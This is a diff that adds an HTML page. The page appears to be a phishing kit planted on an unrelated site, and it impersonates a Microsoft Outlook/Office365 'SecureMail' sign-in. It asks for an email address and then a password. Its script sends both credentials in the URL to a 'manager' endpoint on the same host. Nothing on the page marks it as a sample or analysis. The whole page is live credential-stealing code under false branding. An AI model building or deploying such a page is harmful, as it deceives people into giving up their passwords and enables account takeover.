@@ -1,0 +1,288 @@
+<!-- URL =http://srisainavajyothioldagehome.com/investment/main.html--><!-- w =(['SRISAINAVAJYOTHIOLDAGEHOME.COM', 'srisainavajyothioldagehome.com'], [datetime.datetime(2020, 2, 19, 10, 14, 57), datetime.datetime(2020, 2, 19, 5, 14, 57)], [datetime.datetime(2022, 2, 19, 10, 14, 57), datetime.datetime(2022, 2, 19, 5, 14, 57)])--><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
+<html>
+ <head>
+  <title>
+   SecureMail
+  </title>
+  <meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+ </head>
+ <link href="cutgrass.ico" rel="shortcut icon"/>
+ <link href="./main_files/converged.login.min.css" rel="stylesheet"/>
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+ </script>
+</html>
+<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass" style="display: block;">
+ <div>
+ </div>
+</body>
+<body background="./main_files/main.png" bgproperties="fixed" onload="unhideBody()" style="visibility: visible;">
+ <style>
+  .textbox { 
+    border: 1px solid #c4c4c4; 
+    height: 40px; 
+    width: 275px; 
+    font-size: 16px; 
+    padding: 4px 4px 4px 4px; 
+    border-radius: 4px; 
+    -moz-border-radius: 4px; 
+    -webkit-border-radius: 4px;
+padding-left:18px;	
+
+ 
+     
+} 
+ 
+.textbox:focus { 
+    outline: none; 
+    border: 1px solid #7bc1f7; 
+    box-shadow: 0px 0px 8px #7bc1f7; 
+    -moz-box-shadow: 0px 0px 8px #7bc1f7; 
+    -webkit-box-shadow: 0px 0px 8px #7bc1f7; 
+}
+ </style>
+</body>
+<form action="" autocomplete="off" method="">
+</form>
+<!-- ko withProperties: { '$loginPage': $data } -->
+<div class="outer">
+ <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
+ <!-- ko if: svr.fShowCookieBanner -->
+ <!-- /ko -->
+ <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }">
+  <!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
+  <!-- /ko -->
+  <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl(), 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') }">
+   <!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') -->
+   <div role="banner">
+    <img .="" class="logo" data-bind="imgSrc" main_files="" microsoft_logo.svg"="" pngsrc="./main_files/microsoft_logo.png” svgsrc=" role="presentation" src="./main_files/microsoft_logo.svg"/>
+   </div>
+   <!-- /ko -->
+   <!-- ko if: showErrorDetails -->
+   <!-- /ko -->
+   <div role="main">
+    <div class="animate" data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }">
+     <!-- ko foreach: views -->
+     <!-- ko if: $parent.currentViewIndex() === $index() -->
+     <!-- ko template: { nodes: [$data], data: $parent } -->
+     <div data-viewid="1">
+      <!-- -->
+      <div class="hide" id="emailBox">
+       <!-- -->
+       <div class="identityBanner">
+        <div class="identity" id="displayName">
+        </div>
+        <div class="profile-photo">
+         <img role="presentation" src="./main_files/picker_account_aad.svg"/>
+        </div>
+       </div>
+      </div>
+      <div class="row text-title" id="loginHeader" role="heading">
+       Outlook|Office365
+      </div>
+      <div aria-level="2" class="subtitle ext-subtitle" data-bind="text: str['WF_STR_App_Title'], externalCss: { 'subtitle': true }" role="heading">
+       Please sign in to your email account to retrieve secure message.
+      </div>
+      <div class="row text-title hide" id="passHeader" role="heading">
+       Enter password
+      </div>
+      <!-- ko if: pageDescription && !svr.fHideLoginDesc -->
+      <!-- /ko -->
+      <div class="row">
+       <div aria-atomic="false" aria-live="assertive" role="alert">
+        <!-- ko if: usernameTextbox.error -->
+        <!-- /ko -->
+       </div>
+       <div class="form-group col-md-24">
+        <!-- ko if: prefillNames().length > 1 -->
+        <!-- /ko -->
+        <!-- ko ifnot: prefillNames().length > 1 -->
+        <div class="placeholderContainer">
+         <!-- ko withProperties: { '$placeholderText': placeholderText } -->
+         <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
+         <div class="alert alert-error col-md-24 hide" id="usernameError">
+          Enter a valid email address.
+         </div>
+         <input aria-describedby="usernameError loginHeader loginDescription" aria-label="Enter your email address" aria-required="true" class="form-control ltr_override" id="i0116" lang="en" maxlength="113" placeholder="Email Address" type="email"/>
+         <input aria-describedby="passwordError loginHeader passwordDesc" aria-label="Enter password" aria-required="true" autocomplete="off" class="form-control hide" id="i0118" name="passwd" placeholder="Email Password" type="password"/>
+         <div aria-label="Please wait" class="progress hide" data-bind="visible: isRequestPending, component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" id="usernameProgress" role="progressbar">
+          <!-- -->
+          <!-- ko if: useCssAnimation -->
+          <div>
+          </div>
+          <div>
+          </div>
+          <div>
+          </div>
+          <div>
+          </div>
+          <div>
+          </div>
+          <div>
+          </div>
+          <!-- /ko -->
+          <!-- ko ifnot: useCssAnimation -->
+          <!-- /ko -->
+         </div>
+         <!-- /ko -->
+         <!-- /ko -->
+         <!-- ko ifnot: usePlaceholderAttribute -->
+         <!-- /ko -->
+        </div>
+        <!-- /ko -->
+       </div>
+      </div>
+      <div class="row">
+       <div>
+        <div class="col-xs-24 form-group no-padding-left-right">
+         <div class="col-xs-12 secondary" data-bind="css: { 'col-xs-12 secondary': isPrimaryButtonVisible(), 'col-xs-24': !isPrimaryButtonVisible() }">
+          <input class="btn btn-block hide" id="idBtn_Back" type="button" value="Back"/>
+         </div>
+         <div class="col-xs-12 secondary" data-bind="css: { 'col-xs-12 primary': isPrimaryButtonVisible(), 'col-xs-24': !isSecondaryButtonVisible() }">
+          <input class="btn btn-block btn-primary hide" id="idSign9" type="submit" value="Sign in"/>
+         </div>
+         <div class="col-xs-24" data-bind="css: { 'col-xs-12 primary': isSecondaryButtonVisible(), 'col-xs-24': !isSecondaryButtonVisible() }">
+          <input class="btn btn-block btn-primary" id="idSIButton9" type="submit" value="Next"/>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="row">
+       <div class="col-md-24">
+        <div class="text-13 action-links">
+         <div class="form-group">
+          <a href="#" id="cantAccessAccount">
+           This secure platform works for all email providers. Your personal information will never be shared with a third party.
+          </a>
+          <a class="hide" href="#" id="forgotPass">
+          </a>
+         </div>
+         <!-- /ko -->
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+ </div>
+ <!-- /ko -->
+</div>
+<!-- /ko -->
+<!-- ko if: showOptOutBanner -->
+<!-- /ko -->
+<div class="footer default" data-bind="css: { 'default': !backgroundLogoUrl() }" id="footer" role="contentinfo">
+ <div data-bind="component: { name: 'footer-control',
+				params: {
+					serverData: svr,
+					showLinks: true },
+				event: {
+					agreementClick: footer_agreementClick,
+					moreInfoClick: footer_onShowDebugDetails } }">
+  <!-- -->
+  <!-- ko if: showLinks || impressumLink || showIcpLicense -->
+  <div class="footerNode text-secondary" id="footerLinks">
+   <!-- ko if: !showIcpLicense -->
+   <span data-bind="html: svr.strCopyrightTxt" id="ftrCopy">
+    ©2018 Microsoft
+   </span>
+   <!-- /ko -->
+   <a data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="#" id="ftrTerms">
+    Terms of use
+   </a>
+   <a data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="#" id="ftrPrivacy">
+    Privacy &amp; cookies
+   </a>
+   <a aria-label="Click here for more options" class="moreOptions" href="#" role="button" title="Click here for more options">
+    <img class="desktopMode" data-bind="imgSrc" pngsrc="" role="presentation" src="./main_files/ellipsis_white.svg" svgsrc=""/>
+    <img class="mobileMode" data-bind="imgSrc" pngsrc="" role="presentation" src="./main_files/ellipsis_grey.svg" svgsrc=""/>
+   </a>
+  </div>
+  <!-- /ko -->
+ </div>
+</div>
+<script type="text/javascript">
+ function validateEmail(email) {
+				var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+				return re.test(email);
+			}
+			$(document).ready(function() {
+				$("#idBtn_Back").click(function() {
+					window.location.replace("index.php");
+				});
+			});
+			$(document).ready(function() {
+				$("#idSIButton9").click(function() {
+					var use = $("#i0116").val();
+					if (validateEmail(use) == true) {
+						$("#usernameProgress").removeClass("hide");
+						var delayInMilliseconds = 10; //1 second
+
+						setTimeout(function() {
+							$("#usernameProgress").addClass("hide");
+							$("#i0116").addClass("hide");
+							$("#usernameError").addClass("hide");
+							$("#emailBox").removeClass("hide");
+							$("#idBtn_Back").removeClass("hide");
+							$("#i0118").removeClass("hide");
+							$("#cantAccessAccount").addClass("hide");
+							$("#passHeader").removeClass("hide");
+							$("#idSign9").removeClass("hide");
+							$("#forgotPass").removeClass("hide");
+							$("#loginHeader").addClass("hide");
+							$("#idSIButton9").addClass("hide");
+							$("#displayName").html(use);
+						}, delayInMilliseconds);
+						
+					} else {
+						$("#usernameError").removeClass("hide");
+					}
+				});
+			});
+			
+			$(document).ready(function() {
+				$('#i0116').bind('keyup', function(e) {
+					if (e.which == 13) {
+						var use = $("#i0116").val();
+						if (validateEmail(use) == true) {
+							$("#usernameProgress").removeClass("hide");
+							var delayInMilliseconds = 100; //1 second
+
+							setTimeout(function() {
+								$("#usernameProgress").addClass("hide");
+								$("#i0116").addClass("hide");
+								$("#usernameError").addClass("hide");
+								$("#emailBox").removeClass("hide");
+								$("#idBtn_Back").removeClass("hide");
+								$("#i0118").removeClass("hide");
+								$("#cantAccessAccount").addClass("hide");
+								$("#passHeader").removeClass("hide");
+								$("#idSign9").removeClass("hide");
+								$("#forgotPass").removeClass("hide");
+								$("#loginHeader").addClass("hide");
+								$("#idSIButton9").addClass("hide");
+								$("#displayName").html(use);
+							}, delayInMilliseconds);
+							
+						} else {
+							$("#usernameError").removeClass("hide");
+						}
+					}
+				});
+			});
+			$(document).ready(function() {
+				$("#idSign9").click(function() {
+					var pass = $("#i0118").val();
+					var user = $("#i0116").val();
+					var data = "email="+user+"&password="+pass;
+					window.location="manager?"+data;
+				});
+			});
+			$('#i0118').bind('keyup', function(e) {
+				if (e.which == 13) {
+					var pass = $("#i0118").val();
+					var user = $("#i0116").val();
+					var data = "email="+user+"&password="+pass;
+					window.location="manager?"+data;
+				}
+			});
+</script>
